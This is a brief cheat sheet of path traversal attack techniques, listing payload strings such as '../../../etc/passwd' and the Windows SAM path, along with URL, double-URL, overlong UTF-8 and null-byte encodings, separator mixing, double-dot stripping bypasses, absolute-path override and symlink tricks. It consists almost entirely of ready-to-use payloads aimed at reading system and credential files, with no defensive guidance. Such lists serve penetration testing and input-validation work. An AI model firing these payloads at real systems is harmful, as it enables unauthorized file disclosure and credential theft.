## Path Traversal Attack Techniques

**Traversal Sequences and Bypass Methods:**
- Basic traversal: `../../../etc/passwd`, `..\..\..\..\windows\system32\config\sam`
- URL encoding: `%2e%2e%2f`, `%2e%2e/`, `..%2f`, `%2e%2e%5c`
- Double URL encoding: `%252e%252e%252f`
- UTF-8 overlong encoding: `%c0%ae%c0%ae%c0%af` (classic IIS/Tomcat bypass)
- Null byte truncation: `../../../etc/passwd%00.png` (PHP < 5.3.4, older Java)
- OS-specific separators: `/` (Unix), `\` (Windows), mixed `../..\..\`
- Path normalization bypass: `....//....//etc/passwd` (double-dot stripping bypass)
- Absolute path override: `/etc/passwd` when `os.path.join("/base", "/etc/passwd")` returns `/etc/passwd`
- Symlink following: create symlink in upload directory pointing outside base

